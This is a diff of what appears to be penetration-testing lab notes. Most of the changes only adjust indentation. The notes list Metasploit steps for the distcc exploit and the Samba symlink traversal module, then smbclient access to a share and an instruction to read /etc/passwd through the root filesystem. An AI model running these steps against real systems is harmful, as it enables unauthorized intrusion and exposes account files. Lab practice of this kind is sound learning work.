@@ -114,29 +114,29 @@ nmap -Pn --script vuln 192.168.1.105
 	
 	   On msfconsole,
 
-	   > msf use exploit/unix/misc/distcc_
+		   > use exploit/unix/misc/distcc_
 
-	   > set rhost 192.168.214.129
+		   > set rhost 192.168.214.129
 
-	   > exploit
+		   > exploit
 
 	   On another terminal
 
-	   # smbclient -L //ip_address
+	   	   # smbclient -L //ip_address
 
 	   On msfconsole,
 
-	   > use auxiliary/admin/smb/samba_symlink_traversal
+		   > use auxiliary/admin/smb/samba_symlink_traversal
 
-	   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
+		   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set rhost ip_address
 
-	   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
+		   msf5 auxiliary(admin/smb/samba_symlink_traversal) > set SMBSHARE tmp
 
-	   msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit
+		   msf5 auxiliary(admin/smb/samba_symlink_traversal) > exploit
 
 	   On terminal,
 
-	   # smbclient  //ip_address/tmp
+	  	   # smbclient  //ip_address/tmp
 				// now you will have the smb shell access, try #cd rootfs #cd etc and #more passwd
 
 
